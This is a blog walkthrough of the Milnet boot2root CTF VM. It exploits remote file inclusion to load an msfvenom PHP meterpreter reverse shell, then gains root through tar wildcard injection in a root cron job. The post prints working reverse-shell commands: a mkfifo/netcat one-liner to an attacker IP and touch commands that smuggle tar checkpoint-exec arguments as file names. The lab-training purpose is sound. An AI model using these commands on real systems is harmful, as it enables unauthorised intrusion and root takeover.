<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Milnet VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-milnet-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-09-08T14:37:38+00:00">September 8, 2016</time><time class="updated" datetime="2025-06-10T20:30:37+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This is a boot2root challenge which we will try to complete. This VM is created by <strong>Warrior</strong> and is a basic exploitable VM so we do not need to worry about any advance exploits and reverse engineering.</span></p>
<p><span style="color: #000000;">Download the VM from –&gt; <strong>https://www.vulnhub.com/entry/milnet-1,148/</strong></span></p>
<h3><span style="color: #800000;"><strong>Breaching Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap)</span></li>
<li><span style="color: #000000;">Recon (Nikto)</span></li>
<li><span style="color: #000000;">LFI due to allow_url_inclued</span></li>
<li><span style="color: #000000;">Install Tamper data (Firefox plugin)</span></li>
<li><span style="color: #000000;">Generate PHP Backdoor (Msfvenom)</span></li>
<li><span style="color: #000000;">Upload and execute a backdoor</span></li>
<li><span style="color: #000000;">Reverse connection (Metasploit)</span></li>
<li><span style="color: #000000;">Open UNIX wildcard text file</span></li>
<li><span style="color: #000000;">Privilege Escalation (cron job)</span></li>
<li><span style="color: #000000;">Import python one-liner for proper TTY shell</span></li>
<li><span style="color: #000000;">Take root access and capture the flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let’s start</strong></span></p>
<p><span style="color: #000000;">As always start off by locating the target with the <strong>netdiscover</strong> command.  Our target is <strong>192.168.1.100. </strong>Now we will scan our target with nmap to know all about its ports.</span></p>
<pre class="theme:classic lang:default decode:true ">nmap -p- -A 192.168.1.100</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-X-2BXSQw-iQ/WuLLK0S4BoI/AAAAAAAAWc8/psO6oHtaW_okx0zCOXxcXIhwDmROWM3QACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Since port 80 was open for http, therefore, we had explored target IP on the browser but didn’t get any useful information. So further we have decided to use Nikto against target URL.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-md5keRyGIqk/WuLLMCUdLPI/AAAAAAAAWdQ/W8CdJqZ6N6gzWpes7ujyfsiFANwqXeK0gCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">To know more about our target we will use <strong>Nikto.</strong></span></p>
<pre class="lang:default decode:true">nikto -h 192.168.1.100</pre>
<p><span style="color: #000000;">As per result dumped by Nikto, it tells something about <strong>info.php</strong>, let verify it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7443JxRUdQE/WuLLMLkt-nI/AAAAAAAAWdM/ywcl2m-WLm0BOnDZqweoHAG8o1re8SZ5gCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">So when we have browsed <strong>http://192.168.1.100/info.php</strong>, we found “allow_url_include” is “on” which means we can call any local or remote file and hence it is pointing towards LFI and RFI vulnerability.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-D87L7AMnxPc/WuLLMmOImdI/AAAAAAAAWdY/hfwfTP3aoAcwEhye3jgdt8YfunAU9xL6gCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Upon finding the said vulnerability our step was clear i.e. we had use <strong>Tamper data</strong>(Firefox plugin)</span><span style="color: #000000;">.</span></p>
<p><span style="color: #000000;">So go to T<strong>ools</strong> on the menu bar and select <strong>Tamper data,</strong> When the Tamper Data opens click on <strong>Start </strong>Tamper.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YXNtCZxDt7Q/WuLLMqbHdzI/AAAAAAAAWdU/szv-IIqpMhc11_MYEzGgRY6tJwc7gEL5QCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Now generate the PHP code with the help of which we will have our meterpreter session and to generate the code type:</span></p>
<pre class="lang:default decode:true ">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 -f raw</pre>
<p><span style="color: #000000;">Copy the code from <strong>&lt;?php</strong> to <strong>die() </strong>and save it on the file with extension .php, we have saved it as <strong>shell.php</strong> on the desktop and run command <strong>python SimpleHTTPServer 80</strong> for transferring it into target’s system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-boYCUCpPZK8/WuLLM_eLthI/AAAAAAAAWdc/SNCUmOvLVV4ekvNj2wIzbnYpmS57LCX9wCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Then on Tamper Data give the path of the file without the extension in the text box adjacent to the route. For example type:</span></p>
<pre class="lang:default decode:true">http://192.168.1.108/shell.php?</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-02hHielltsY/WuLLNfkMstI/AAAAAAAAWdg/qyxHuicFVI85i7IVCdQ-xTJyVc6eZfPxgCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Before clicking on OK run Metasploit and type:</span></p>
<pre class="lang:default decode:true">msf use exploit/multi/handler
msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) set lhost 192.168.1.108
msf exploit(multi/handler) set lport 4444
msf exploit(multi/handler) exploit</pre>
<p><span style="color: #000000;">And when you click on ok you will have your meterpreter session. You can type the following command to get the information about the system:</span></p>
<pre class="lang:default decode:true">sysinfo</pre>
<p><span style="color: #000000;">Then check the list of the thing present in langman by typing :</span></p>
<pre class="lang:default decode:true">ls</pre>
<p><span style="color: #000000;">There is only one folder available so let’s go into it.</span></p>
<pre class="lang:default decode:true">cd SDINET</pre>
<p><span style="color: #000000;"><strong>ls </strong>(to check the contents of SDINET)</span></p>
<p><span style="color: #000000;">Here, in SDINET you will find a text file which will show you all the steps to move ahead. It contains <strong>Unix wildcard attacks</strong>.</span></p>
<p><span style="color: #000000;"><a style="color: #000000;" href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/</a></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-l9IPez0-_4o/WuLLN8DcNEI/AAAAAAAAWdk/PG_xpqEpe3k5nUgQ5YqAyGvcOUWMCLMRwCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Some further digging revealed that crontab was running a backup script as root, which used tar to compress the contents of /var/www/html. One of the attacks mentioned in the text document covered tar. The commands we used are:</span></p>
<pre class="lang:default decode:true">cat /etc/crontab
cat /backup/backup.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cSOXChg_E64/WuLLOABvkuI/AAAAAAAAWdo/xllIM20lPVkRsnLP5cvNPGeww_5ltlR9QCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">On a new terminal generate one-liner malicious code for achieving netcat reverse connection using msfvenom and enter the following command for that.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.108 lport=8888 R</pre>
<p><span style="color: #000000;">After that copy and paste the generated code inside the meterpreter session as described below and start netcat.</span></p>
<pre class="lang:default decode:true">nc -lvp 8888</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-8Z2SU5-yHB0/WuLLLMBb_FI/AAAAAAAAWdA/bN52y7EwgogNhssBOI-svpLJ-x9r2L0dwCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">From inside DefenseCode_Unix_WildCards_Gone_Wild.txt, it has a section about how to get a command execution using the tar command</span></p>
<p><span style="color: #000000;">Next, we ran the following commands inside the meterpreter session:</span></p>
<pre class="lang:default decode:true ">shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
echo "mkfifo /tmp/ivkwne; nc 192.168.1.108 8888 0&lt;/tmp/ivkwne | /bin/sh &gt;/tmp/ivkwne 2&gt;&amp;1; rm /tmp/ivkwne" &gt; shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-nUpmFTRcA0I/WuLLLUNXXXI/AAAAAAAAWdE/yO8Od-rDU_cvbtPheG1uurPMCrTB0lFRQCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">The above commands help the tar command to run the file, shell.sh after the first file is archived. Since the backup.sh script is running as root, this has the effect of spawning a netcat shell and sending it to the attack platform on port 8888.</span></p>
<p><span style="color: #000000;">And if you go back to the terminal window where the listener was on, you will have victim’s reverse connection in some time, after that type following command to import python one-liner script for accessing proper tty shell.</span></p>
<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'
</pre>
<p><span style="color: #000000;">And you will root access, further move into the/root directory and grab the credit.txt file and finished this challenge.</span></p>
<p><span style="color: #000000;">HAPPPPPYYYY HACKIIIIING!!!!!! </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pil06xkr54k/WuLLLyEOHFI/AAAAAAAAWdI/2eld6TFEecMySpgv8LjvdYkk379qM9VgACLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
